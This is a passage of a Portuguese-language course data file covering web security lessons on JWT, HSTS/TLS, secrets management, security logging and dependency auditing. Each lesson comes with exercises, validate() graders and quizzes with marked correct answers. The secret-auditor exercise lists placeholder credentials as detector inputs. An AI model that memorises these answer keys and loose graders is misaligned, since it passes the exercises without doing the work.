          { question: 'Por que o access token deve ter expiração curta (15min)?', options: ['Para economizar espaço no banco', 'Se vazar, fica válido por no máximo 15 minutos — minimiza a janela de comprometimento', 'JWT com expiração longa usa mais memória', 'Requisito da especificação JWT'], correct: 1, explanation: 'Access tokens curtos limitam o dano de um vazamento. O refresh token (mais longo) é armazenado de forma mais segura (cookie httpOnly). Se o access token vazar, o atacante tem uma janela pequena.' },
          { question: 'Qual a diferença entre HS256 e RS256 em JWT?', options: ['HS256 é mais rápido, RS256 é mais seguro', 'HS256 usa chave simétrica (mesma para assinar e verificar), RS256 usa par de chaves assimétrico', 'HS256 é para HTTP, RS256 para HTTPS', 'Não há diferença prática'], correct: 1, explanation: 'HS256: todos que verificam também podem criar. RS256: só o auth server (chave privada) cria, qualquer serviço com chave pública pode verificar sem poder criar. Ideal para microserviços.' },
          { question: 'O que é refresh token rotation?', options: ['Trocar o algoritmo JWT periodicamente', 'A cada uso do refresh token, invalidar o antigo e emitir novo — detecta roubo de token', 'Rotacionar servidores de autenticação', 'Trocar o segredo JWT semanalmente'], correct: 1, explanation: 'Com rotation: se um refresh token for roubado e usado pelo atacante, o token do usuário legítimo é invalidado. Quando o usuário tenta usar o token antigo, é rejeitado — sinal de comprometimento detectado.' },
        ],
      },
    },

    {
      id: 'mod-11-8',
      title: 'Headers de Segurança, HSTS e Certificados Let\'s Encrypt',
      duration: '40 min',
      xp: 180,
      content: {
        sections: [
          { type: 'text', content: 'Ter HTTPS é o mínimo — o que separa uma aplicação segura de uma vulnerável são os headers de segurança que vêm junto. HSTS force HTTPS mesmo que o usuário tente HTTP. Content-Security-Policy bloqueia XSS. X-Frame-Options previne clickjacking. Let\'s Encrypt automatiza certificados gratuitos. Esta fase cobre a configuração real que vai em produção.' },
          { type: 'code', lang: 'javascript', content: '// ── TLS HANDSHAKE (SIMPLIFICADO) ────────────────────\n// 1. Cliente conecta → Servidor envia certificado (chave pública + identidade)\n// 2. Cliente verifica certificado (CA confiável? Expirado? Domínio correto?)\n// 3. Troca de chaves ECDHE → chave de sessão simétrica\n// 4. Comunicação criptografada com AES-256-GCM\n\n// TLS 1.3 vs 1.2:\n// 1.3: 1 RTT (era 2), removeu cipher suites fracas, forward secrecy obrigatório\n// 1.2: ainda seguro mas desaconselhe TLS 1.0/1.1 — devem ser desabilitados\n\n// ── HSTS: HTTP STRICT TRANSPORT SECURITY ─────────────\napp.use((req, res, next) => {\n  if (req.headers["x-forwarded-proto"] === "http") {\n    return res.redirect(301, `https://${req.headers.host}${req.url}`);\n  }\n  next();\n});\n\napp.use(helmet({\n  hsts: {\n    maxAge: 31536000,        // 1 ano\n    includeSubDomains: true,\n    preload: true,           // lista built-in no browser\n  },\n}));\n// HSTS Preload: após o primeiro acesso HTTPS, browser usa sempre HTTPS\n// Mesmo que usuário digite http://, browser corrige antes de conectar\nconsole.log("HSTS preload = HTTPS mesmo antes do primeiro request");' },
          { type: 'code', lang: 'bash', content: '# ── LET\'S ENCRYPT: CERTIFICADO GRÁTIS E AUTOMÁTICO ──\n# DV (Domain Validation): valida que você controla o domínio\n# Grátis, 5 minutos, renovação automática\n# Para 99% dos projetos: suficiente\n\n# Instalação e obtenção:\nsudo apt install certbot python3-certbot-nginx\nsudo certbot --nginx -d meusite.com -d www.meusite.com\n\n# Renovação automática (cron — 2x ao dia):\n0 0,12 * * * certbot renew --quiet --post-hook "systemctl reload nginx"\n\n# Certificado vence em 90 dias propositalmente:\n# → Força automação\n# → Chaves comprometidas são substituídas mais rápido\n# → Plataformas como Vercel/Netlify fazem isso automaticamente\n\n# Testar configuração TLS:\n# https://www.ssllabs.com/ssltest/ → deve dar A ou A+\n# https://securityheaders.com → deve dar A\necho "Let\'s Encrypt: grátis, automático, suficiente para 99% dos casos"' },
          {
            type: 'common_error',
            title: 'Não configurar headers de segurança além do HTTPS',
            wrong: '# Sem renovação automática configurada:\n# certbot instalado mas cron não configurado\n# → certificado vence → ERR_CERT_DATE_INVALID\n# → usuário descobre via Twitter às 3h da manhã',
            wrongLabel: 'Certificado vencido = site inacessível + perda de confiança.',
            right: '# 1. Cron para renovação automática:\n# 0 0,12 * * * certbot renew --quiet --post-hook "nginx -s reload"\n\n# 2. Monitoramento proativo (alerta 14 dias antes):\nconst tls = require("tls");\nfunction checarCert(host) {\n  tls.connect(443, host, { servername: host }, function() {\n    const dias = Math.floor((new Date(this.getPeerCertificate().valid_to) - Date.now()) / 86400000);\n    if (dias < 14) console.warn(`⚠️ ${host}: ${dias} dias restantes`);\n    this.end();\n  });\n}',
            rightLabel: 'Renovação automática + monitoramento proativo = zero surpresas com certificados.',
            explanation: 'Use Vercel/Netlify/Railway em vez de gerenciar nginx próprio: renovação automática garantida. Se gerenciar o próprio servidor, configure cron E monitoramento externo (UptimeRobot verifica certificados gratuitamente).',
          },
        ],
        exercise: {
          title: 'Analisar configuração TLS e gerar relatório',
          description: 'Implemente avaliarConfigTLS(config) que retorna score 0-100 e lista de problemas/pontos positivos. Critérios: TLS 1.2/1.3 apenas (+20), HSTS ativo (+20), HSTS preload (+10), redirect HTTP→HTTPS (+20), cert expira >14 dias (+15), cert >30 dias (+5), OCSP Stapling (+10). Deduza -10 por TLS 1.0/1.1.',
                    solutionHint: 'TLS 1.3 obrigatório. HSTS com includeSubDomains. Certificate Transparency log. OCSP Stapling melhora performance. Cipher suites: sem RC4, DES, 3DES.',
starterCode: `const configs = [
  { nome: "Inseguro", protocols: ["TLSv1.0","TLSv1.1","TLSv1.2"], hsts: false, certExpiresInDays: 5, redirectHttp: false },
  { nome: "Bom",      protocols: ["TLSv1.2","TLSv1.3"], hsts: true, hstsMaxAge: 31536000, certExpiresInDays: 60, redirectHttp: true, ocsp: true },
  { nome: "Perfeito", protocols: ["TLSv1.3"], hsts: true, hstsMaxAge: 31536000, hstsPreload: true, certExpiresInDays: 45, redirectHttp: true, ocsp: true },
];

function avaliarConfigTLS(config) {
  let score = 0;
  const problemas = [], ok = [];
  // implemente os critérios
  return { score, problemas, ok };
}

configs.forEach(c => {
  const { score, problemas, ok } = avaliarConfigTLS(c);
  console.log(c.nome + ': ' + score + '/100');
  ok.forEach(i => console.log('  ✅ ' + i));
  problemas.forEach(i => console.log('  ❌ ' + i));
});`,
          validate: (output, code) => {
            return code.includes('avaliarConfigTLS') && code.includes('score') &&
              output.includes('100') && (output.includes('✅') || output.includes('OK')) &&
              (output.includes('❌') || output.includes('problema'));
          },
          validateMessage: 'Servidor "Perfeito" deve ter score 100. Use ✅ e ❌. Servidor inseguro deve mostrar problemas.',
        },
        quiz: [
          { question: 'O que é HSTS?', options: ['Protocolo alternativo ao HTTPS', 'Header que instrui o browser a usar HTTPS por um período, prevenindo downgrade attacks', 'Sistema de teste de segurança', 'Algoritmo de hash'], correct: 1, explanation: 'HSTS: após o primeiro acesso HTTPS, browser nunca tenta HTTP pelo período definido (maxAge). Previne SSL stripping — atacante não consegue fazer o cliente se conectar em HTTP.' },
          { question: 'Por que Let\'s Encrypt emite certificados de 90 dias?', options: ['Limitação técnica', 'Para forçar automação — chaves comprometidas são substituídas mais rápido', 'Para cobrar mais por anuais', 'Certificados longos são menos seguros'], correct: 1, explanation: '90 dias é intencional: forçando automação, chaves comprometidas ficam válidas por menos tempo e o processo de renovação fica bem testado. Plataformas como Vercel fazem isso automaticamente.' },
          { question: 'O que é mixed content?', options: ['Mistura de HTML, CSS e JS no mesmo arquivo', 'Página HTTPS carregando recurso via HTTP — browsers bloqueiam', 'Conflito entre diferentes versões de TLS', 'Uso de múltiplos certificados no mesmo servidor'], correct: 1, explanation: 'Mixed content: página servida em HTTPS mas com recursos (imagens, scripts, fontes) carregados via HTTP. O browser bloqueia por segurança — o recurso HTTP poderia ser interceptado e modificado.' },
        ],
      },
    },

    {
      id: 'mod-11-9',
      title: 'Secrets Management: O que Nunca Vai no Git',
      duration: '35 min',
      xp: 160,
      content: {
        sections: [
          { type: 'text', content: 'Todo dev vai, em algum momento, commitar acidentalmente uma chave de API. Em segundos, bots escaneiam o GitHub. Um segredo no git público é comprometido — independente de você deletar depois. O histórico do git guarda tudo.' },
          { type: 'code', lang: 'bash', content: '# ── O PROBLEMA ───────────────────────────────────────\n# git add . && git commit -m "config" && git push\n# 10 segundos: bot escaneia → chave AWS exposta\n# Fatura da AWS: $50.000 em 24h (caso real documentado)\n\n# Deletar não ajuda:\n# git rm .env && git commit → chave ainda no histórico!\n# git log --all -p | grep AWS_ACCESS_KEY → ainda lá\n\n# ── .gitignore OBRIGATÓRIO (antes do primeiro commit) ─\n# .env\n# .env.local\n# .env.*.local\n# *.pem\n# *.key\n# secrets/\n\n# ── SE JÁ ACONTECEU: REMEDIAÇÃO ──────────────────────\n# 1. INVALIDE A CHAVE PRIMEIRO (não perca tempo limpando git)\n# 2. Limpe o histórico com git-filter-repo:\npip install git-filter-repo\ngit filter-repo --path .env --invert-paths\n# 3. Force push (avise o time)\ngit push origin --force --all\n# 4. Repositório público = considere comprometido para sempre\necho "Invalidar PRIMEIRO, limpar DEPOIS"' },
          { type: 'code', lang: 'javascript', content: '// ── GERENCIAR SEGREDOS CORRETAMENTE ─────────────────\n\n// ✅ Variáveis de ambiente — o padrão\nconst config = {\n  db:     process.env.DATABASE_URL,\n  jwt:    process.env.JWT_SECRET,\n  stripe: process.env.STRIPE_SECRET_KEY,\n};\n\n// Validar na inicialização (fail fast):\nconst required = (name) => {\n  const val = process.env[name];\n  if (!val) throw new Error(`Env var faltando: ${name}`);\n  return val;\n};\nconst JWT_SECRET   = required("JWT_SECRET");\nconst DATABASE_URL = required("DATABASE_URL");\n\n// .env.example (VA no git — só placeholders):\n// DATABASE_URL=postgres://user:password@host/dbname\n// JWT_SECRET=gere-com-crypto.randomBytes(32).toString("hex")\n// STRIPE_SECRET_KEY=sk_live_SUA_CHAVE_AQUI\n\n// .env (NUNCA no git — valores reais)\n\n// Deploy: variáveis de ambiente da plataforma\n// Vercel: Project Settings → Environment Variables\n// Railway: Variables tab\n// Todas criptografam em repouso\nconsole.log("Regra: se duvida se deve ir no git, não vai");' },
          {
            type: 'common_error',
            title: 'Commitar .env ou hardcodar segredos no codigo',
            wrong: 'const stripe = new Stripe("sk_live_EXEMPLO_NUNCA_FACA_ISSO_NO_CODIGO");\nconst db = knex({ connection: "postgres://admin:senha@db.empresa.com/prod" });\n// Bots escaneiam GitHub: segredo exposto = comprometido em segundos',
            wrongLabel: 'Chave hardcoded + git push = comprometido antes de fechar o terminal.',
            right: 'const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);\nconst db = knex({ connection: process.env.DATABASE_URL });\n// .env.example no git (placeholders)\n// .env real apenas local e nas variaveis da plataforma de deploy',
            rightLabel: '.env.example documenta as variaveis (sem valores). .env real nunca no git.',
            explanation: 'O padrao: .env.example com placeholders no git para documentar. .env real apenas localmente. Em producao, use variaveis de ambiente da plataforma.',
          },
        ],
        exercise: {
          title: 'Auditor de segredos no código',
          description: 'Implemente auditarCodigo(linhas) que detecta possíveis segredos: chaves de API (strings longas após "key"/"token"/"secret"), URLs com credenciais embutidas (postgres://user:senha@), chaves AWS (AKIA...), e senhas hardcoded. Ignore linhas com process.env.',
          starterCode: `const codigo = [
  'const db = knex({ connection: "postgres://admin:senha123@db.empresa.com/prod" });',
  'const apiKey = "sk_live_EXEMPLO_CHAVE_FALSA_NAO_FUNCIONA";',
  'const awsKey = "AKIAIOSFODNN7EXAMPLE";',
  'const jwtToken = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMifQ.abc123";',
  'const mensagem = "Bem-vindo!";',
  'const url = process.env.DATABASE_URL;',
  'const secret = process.env.JWT_SECRET;',
  'const senha = "super_secreta_123456";',
];

function auditarCodigo(linhas) {
  const alertas = [];
  const padroes = [
    // Implemente pelo menos 4 padrões com { nome, regex, severidade }
  ];
  linhas.forEach((linha, idx) => {
    if (linha.includes('process.env')) return; // seguro
    // verifique cada padrão
    // push: { linha: idx+1, tipo: nome, severidade }
  });
  return alertas;
}

const resultado = auditarCodigo(codigo);
console.log('Encontrados ' + resultado.length + ' possíveis segredos:');
resultado.forEach(a => console.log('  L' + a.linha + ' [' + a.severidade.toUpperCase() + '] ' + a.tipo));`,
          validate: (output, code) => {
            return code.includes('auditarCodigo') && code.includes('process.env') &&
              (code.includes('regex') || code.includes('RegExp') || code.includes('test(') || code.includes('match(')) &&
              parseInt((output.match(/encontrados\s+(\d+)/i) || ['','0'])[1]) >= 4;
          },
          validateMessage: 'auditarCodigo deve encontrar >= 4 alertas. Linhas com process.env devem ser ignoradas.',
        },
        quiz: [
          { question: 'Por que deletar .env do git não resolve o problema?', options: ['Resolve — o arquivo é removido permanentemente', 'Não resolve: histórico git preserva todas as versões — git log ainda mostra o conteúdo', 'Resolve se fizer git gc depois', 'Depende se o repo é público'], correct: 1, explanation: 'Git é imutável. git rm remove do working tree, mas o commit anterior existe no histórico. git log --all -p ainda mostra o arquivo. A única solução real: invalide a credencial + git filter-repo para reescrever histórico.' },
          { question: 'Qual deve ser o PRIMEIRO passo ao descobrir credencial exposta no GitHub?', options: ['Tornar o repo privado', 'git filter-repo para limpar o histórico', 'INVALIDAR a credencial na plataforma — antes de qualquer outra coisa', 'Deletar o repositório'], correct: 2, explanation: 'Invalide primeiro: bots monitoram GitHub em tempo real. Você pode descobrir 1 hora depois, mas a chave pode já ter sido usada há 59 minutos. Limpar o histórico é importante mas não protege retroativamente.' },
          { question: 'O que deve estar no .gitignore antes do primeiro commit?', options: ['Apenas node_modules/', 'Apenas arquivos de build', '.env, *.pem, *.key e qualquer arquivo com credenciais reais', 'Apenas .env.local'], correct: 2, explanation: '.gitignore deve ser criado antes do primeiro commit. Inclua: .env, *.pem, *.key, *.pfx, secrets/. Use .env.example (no git) para documentar quais variáveis existem, sem os valores reais.' },
        ],
      },
    },

    {
      id: 'mod-11-10',
      title: 'Logging de Segurança e Auditoria (OWASP A09)',
      duration: '40 min',
      xp: 180,
      content: {
        sections: [
          { type: 'text', content: 'OWASP A09 (Security Logging Failures) é negligenciado porque não gera bug imediato. Mas sem logs adequados, ataques são indetectáveis — o dano pode continuar por meses. O tempo médio para detectar uma brecha sem logging adequado é 207 dias.' },
          { type: 'code', lang: 'javascript', content: '// ── O QUE LOGAR vs O QUE NUNCA LOGAR ────────────────\n\n// ✅ SEMPRE LOGAR:\n// - Tentativas de login (sucesso e falha) com IP e timestamp\n// - Alterações de permissão/role\n// - Acessos negados (401, 403)\n// - Ações administrativas\n// - Exportação de dados em massa\n\n// ❌ NUNCA LOGAR:\n// - Senhas (nem "mascaradas")\n// - Tokens JWT completos\n// - CPF, cartão de crédito (LGPD!)\n// - Chaves de API\n\n// ── LOG ESTRUTURADO ───────────────────────────────────\n// Ruim:\nconsole.log("Login falhou para " + email); // difícil parsear\n\n// Bom (pino):\nconst logger = require("pino")({\n  redact: ["password", "token", "authorization"],\n});\n\nlogger.warn({\n  event:     "auth.login.failed",\n  email:     email.replace(/(.).+(@)/, "$1***$2"), // mascara\n  ip:        req.ip,\n  timestamp: new Date().toISOString(),\n  reason:    "invalid_credentials",\n});\n// JSON estruturado = fácil de indexar, buscar, alertar\nconsole.log("Log estruturado = observabilidade real");' },
          { type: 'code', lang: 'javascript', content: '// ── DETECÇÃO DE ANOMALIAS ────────────────────────────\nconst falhasPorIP = new Map();\n\nfunction registrarFalhaLogin(ip, email) {\n  const atual = falhasPorIP.get(ip) || { count: 0, inicio: Date.now() };\n\n  if (Date.now() - atual.inicio > 5 * 60 * 1000) {\n    falhasPorIP.set(ip, { count: 1, inicio: Date.now() });\n    return;\n  }\n\n  atual.count++;\n  falhasPorIP.set(ip, atual);\n\n  if (atual.count >= 10) {\n    logger.warn({ event: "auth.brute_force_detected", ip, email, attempts: atual.count });\n    // Alerte: email, Slack, PagerDuty\n  }\n}\n\n// ── LGPD E LOGS ──────────────────────────────────────\n// Dados pessoais em logs têm implicações legais:\n// - Finalidade legítima para estar nos logs\n// - Prazo de retenção definido\n// - Possibilidade de exclusão se solicitado\n\nconst mascarar = {\n  email:    (e) => e.replace(/(.).+(@.+)/, "$1***$2"),\n  cpf:      (c) => c.replace(/(\\d{3})\\d{6}(\\d{2})/, "$1.XXX.XXX-$2"),\n  ip:       (i) => i.replace(/\\.(\\d+)$/, ".xxx"),\n};\n\n// Retenção:\n// Logs de segurança: 1-2 anos\n// Acesso geral: 90 dias\n// Debug: 7-30 dias\nconsole.log("LGPD: dado pessoal em log tem responsabilidade legal");' },
          {
            type: 'common_error',
            title: 'Logar senha em texto ou nao logar falhas de autenticacao',
            wrong: "app.post('/login', (req, res) => {\n  console.log('Login:', req.body); // loga senha!\n  // sem log de falhas: brute force invisivel\n});",
            wrongLabel: 'Logar req.body em endpoint de login = senha em texto nos logs.',
            right: "app.post('/login', async (req, res) => {\n  const user = await auth(req.body.email, req.body.password);\n  if (!user) {\n    logger.warn({ event: 'auth.login.failed', email: mascarar.email(req.body.email), ip: req.ip });\n    return res.status(401).json({ error: 'Credenciais invalidas' });\n  }\n  logger.info({ event: 'auth.login.success', userId: user.id, ip: req.ip });\n});",
            rightLabel: 'Log eventos de seguranca com contexto (IP, userId mascarado) sem dados sensiveis.',
            explanation: 'O equilibrio: log suficiente para detectar ataques e investigar incidentes, mas nunca dados que se tornam novo vetor de ataque.',
          },
        ],
        exercise: {
          title: 'Sistema de auditoria com detecção de brute force',
          description: 'Implemente registrarEvento(tipo, dados) que mascara email/ip antes de salvar, detectarBruteForce(ip) que alerta após 5 falhas em 2 minutos, e gerarRelatorio() que retorna { total, porTipo, alertas }.',
          starterCode: `const logs = [];
const tentativas = new Map();
const mascarar = {
  email: (e) => e.replace(/(.).+(@)/, '$1***$2'),
  ip:    (ip) => ip.replace(/\.\d+$/, '.xxx'),
};

function registrarEvento(tipo, dados) {
  // mascara email e ip, salva em logs[] com timestamp
}

function detectarBruteForce(ip) {
  // conta tentativas do mesmo IP nos últimos 2min
  // >= 5: retorna { alerta: true, tentativas: N }
}

function gerarRelatorio() {
  // retorna { total, porTipo: {}, alertas: [] }
}

registrarEvento('auth.login.success', { userId: 42, ip: '192.168.1.1', email: 'ana@test.com' });
for (let i = 0; i < 5; i++)
  registrarEvento('auth.login.failed', { ip: '10.0.0.1', email: 'admin@test.com' });

const bf = detectarBruteForce('10.0.0.1');
console.log('Brute force:', bf.alerta, 'tentativas:', bf.tentativas);
const rel = gerarRelatorio();
console.log('Total:', rel.total, 'Email mascarado:', logs[0]?.email);`,
          validate: (output, code) => {
            return code.includes('registrarEvento') && code.includes('detectarBruteForce') &&
              code.includes('mascarar') && output.includes('true') &&
              (output.includes('5') || output.includes('brute')) &&
              (output.includes('***') || output.includes('xxx'));
          },
          validateMessage: 'registrarEvento deve mascarar email/ip (verificar *** nos logs). detectarBruteForce deve alertar após 5 falhas.',
        },
        quiz: [
          { question: 'Por que o OWASP A09 é crítico mesmo sem impacto imediato?', options: ['Logs consomem memória', 'Sem logs adequados, ataques são indetectáveis — dano pode continuar por meses', 'LGPD exige logs de tudo', 'Dificulta debugging'], correct: 1, explanation: 'Sem logs, você não detecta ataques em progresso, não sabe o que foi comprometido, e não tem dados para melhorar segurança. Tempo médio para detectar brecha sem logging: 207 dias.' },
          { question: 'O que NUNCA deve aparecer em logs?', options: ['IP do usuário', 'Timestamp', 'Senhas, tokens, números de cartão e dados pessoais sensíveis', 'IDs de usuário'], correct: 2, explanation: 'Logs são frequentemente acessíveis por mais pessoas que o banco (SREs, devs, monitoramento). Dados sensíveis em logs criam novo vetor de ataque. Use mascaramento: a***@gmail.com.' },
          { question: 'O que é "impossible travel" em detecção de anomalias?', options: ['Request com latência impossível', 'Login de São Paulo e Nova York com 5 minutos de diferença — fisicamente impossível', 'Request com timestamp no futuro', 'Upload maior que o limite'], correct: 1, explanation: 'Impossible travel: mesmo usuário em duas localidades geograficamente impossíveis no mesmo período. Indica credencial comprometida ou atacante usando VPN.' },
        ],
      },
    },

    {
      id: 'mod-11-11',
      title: 'Segurança de Dependências: npm audit e CVEs',
      duration: '35 min',
      xp: 160,
      content: {
        sections: [
          { type: 'text', content: 'O supply chain attack é quando o problema não está no seu código — está numa das centenas de dependências que você usa. O Log4Shell (2021) afetou metade da internet por uma vulnerabilidade numa lib. npm tem casos similares. Saber avaliar CVEs é essencial para o trabalho sênior.' },
          { type: 'code', lang: 'bash', content: '# ── npm audit ────────────────────────────────────────\nnpm audit\n# found 3 vulnerabilities (1 moderate, 2 high)\n# Package: lodash | Severity: High | CVSS: 7.4\n# Patched in: >=4.17.21\n\n# Fix automático (sem breaking changes):\nnpm audit fix\n# Fix com breaking changes (cuidado):\nnpm audit fix --force\n\n# No CI/CD — bloquear build com high/critical:\nnpm audit --audit-level=high --json | node scripts/check-audit.js\n\n# ── COMO LER UM CVE ──────────────────────────────────\n# CVE-2021-44228 (Log4Shell): CVSS 10.0 = Critical\n# CVSS Scale: 0-3.9 Low | 4-6.9 Medium | 7-8.9 High | 9-10 Critical\n#\n# Perguntas antes de priorizar:\n# 1. Você usa o código vulnerável diretamente?\n# 2. É acessível externamente (via rede)?\n# 3. Tem fix disponível?\n\n# Ferramentas além do npm audit:\n# Dependabot (GitHub): PRs automáticos de segurança\n# Snyk: análise mais profunda, detecta código vulnerável\n# socket.dev: detecta supply chain attacks (typosquatting, etc)\necho "CVSS >= 9.0 = patch hoje, não amanhã"' },
          { type: 'code', lang: 'javascript', content: '// ── ESTRATÉGIA PRÁTICA ───────────────────────────────\nconst politica = {\n  critical: "Patch em até 24h — bloquear CI/CD",\n  high:     "Patch em até 7 dias — ticket urgente",\n  moderate: "Patch em até 30 dias — próximo sprint",\n  low:      "Patch quando possível — backlog",\n};\n\n// ── MINIMIZAR SUPERFÍCIE ─────────────────────────────\n// 1. Menos deps = menos superfície\n//    Lodash para 1 função → use código nativo\n// 2. Prefira deps com manutenção ativa\n//    Última atualização há 5 anos = sem patches de segurança\n// 3. Lock file SEMPRE no git\n//    Sem package-lock.json → npm pode instalar versão vulnerável\n// 4. npm ci em CI/CD (em vez de npm install)\n//    Usa estritamente o lock file\n\n// ── DEPENDABOT: AUTOMATIZAR UPDATES ─────────────────\n// .github/dependabot.yml:\n// version: 2\n// updates:\n//   - package-ecosystem: npm\n//     directory: /\n//     schedule:\n//       interval: weekly\n// O GitHub abre PRs automaticamente quando deps têm CVEs\nconsole.log("Deps = código de terceiros que você assumiu responsabilidade");' },
          {
            type: 'common_error',
            title: 'Ignorar npm audit ou usar --force sem entender',
            wrong: '# npm audit mostra 15 vulns\n# Dev: "vou olhar depois" (nunca olhou)\nnpm audit fix --force  # sem ler o que muda\ngit push  # quebrou producao',
            wrongLabel: 'npm audit ignorado = CVE conhecida em producao. --force sem teste = quebrar prod.',
            right: '# Processo correto:\nnpm audit --audit-level=moderate\n# Para cada vuln: avalie impacto real\nnpm audit fix  # apenas patches sem breaking changes\n# Teste completo antes de --force',
            rightLabel: 'audit no CI/CD + avaliacao de impacto + fix com testes = gestao madura de dependencias.',
            explanation: 'npm audit fix --force pode atualizar para versoes major com breaking changes. Leia o que muda, rode testes, faca em branch separada. A pressa em resolver pode criar problemas piores.',
          },
        ],
        exercise: {
          title: 'Priorizar plano de ação de vulnerabilidades',
          description: 'Implemente filtrarCriticas(vulns), calcularPrioridade(vuln) e gerarPlanoAcao(vulns). Prioridade base = cvss*10, +20 se fixavel, +15 se não transitiva, -10 se transitiva e cvss<8. Plano: imediato(>=80), esta_semana(60-79), proximo_sprint(<60).',
          starterCode: `const vulns = [
  { id: 'CVE-001', pkg: 'lodash',       cvss: 9.8, severity: 'critical', fixavel: true,  transitiva: false },
  { id: 'CVE-002', pkg: 'minimist',     cvss: 7.5, severity: 'high',     fixavel: true,  transitiva: true  },
  { id: 'CVE-003', pkg: 'xmldom',       cvss: 5.3, severity: 'moderate', fixavel: false, transitiva: true  },
  { id: 'CVE-004', pkg: 'express',      cvss: 8.1, severity: 'high',     fixavel: true,  transitiva: false },
  { id: 'CVE-005', pkg: 'jsonwebtoken', cvss: 9.1, severity: 'critical', fixavel: true,  transitiva: false },
];

function filtrarCriticas(vulns) { }
function calcularPrioridade(vuln) { }
function gerarPlanoAcao(vulns) { }

const criticas = filtrarCriticas(vulns);
console.log('Critical/High:', criticas.length);
const plano = gerarPlanoAcao(vulns);
console.log('Imediato:', plano.imediato.map(v => v.pkg).join(', '));
console.log('Esta semana:', plano.esta_semana.map(v => v.pkg).join(', '));`,
          validate: (output, code) => {
            const o = output.toLowerCase();
            return code.includes('filtrarCriticas') && code.includes('calcularPrioridade') &&
              code.includes('cvss') && (o.includes('imediato') || o.includes('immediate')) &&
              (o.includes('jsonwebtoken') || o.includes('lodash'));
          },
          validateMessage: 'lodash e jsonwebtoken devem estar em "imediato". filtrarCriticas deve retornar >= 3 items.',
        },
        quiz: [
          { question: 'O que significa CVSS Score 9.8?', options: ['9.8% dos usuários afetados', 'Criticidade máxima — RCE remoto sem autenticação, patch hoje', '9.8 mil sistemas afetados', 'Descoberta há 9.8 meses'], correct: 1, explanation: 'CVSS 0-3.9 Low, 4-6.9 Medium, 7-8.9 High, 9-10 Critical. CVSS 9.8 = RCE remoto sem autenticação — patch imediato obrigatório.' },
          { question: 'Por que o package-lock.json deve estar no git?', options: ['Para facilitar debugging', 'Garante versões exatas instaladas — sem lock, npm pode instalar versão com CVE novo', 'Exigido pelo npm', 'Para documentar deps'], correct: 1, explanation: 'Sem lock file: npm resolve semver e pode instalar versão mais nova com vulnerabilidade. npm ci em CI/CD usa o lock file estritamente — mais seguro e mais rápido.' },
          { question: 'O que é supply chain attack?', options: ['Ataque a sistema de e-commerce', 'Comprometer uma dependência popular para atingir todos os projetos que a usam', 'Ataque ao banco de fornecedores', 'SQL Injection em ERP'], correct: 1, explanation: 'Supply chain attack: comprometer a cadeia de suprimento de software. Exemplos: typosquatting (pacote com nome parecido), invadir conta do mantenedor, injetar malware em lib popular. O ataque SolarWinds (2020) é o caso mais famoso.' },
        ],
      },
    },
  {
    id: 'mp-phase-11',
    title: '🛠️ Mini-Projeto: Scanner de Vulnerabilidades',
    duration: '60 min',
    xp: 200,
    isMiniProject: true,
    miniProject: miniProjectPhase17,
    content: {
      sections: [{ type: 'text', content: 'Construa algo real aplicando o que aprendeu nesta fase.' }]
    }
  }  ],
};
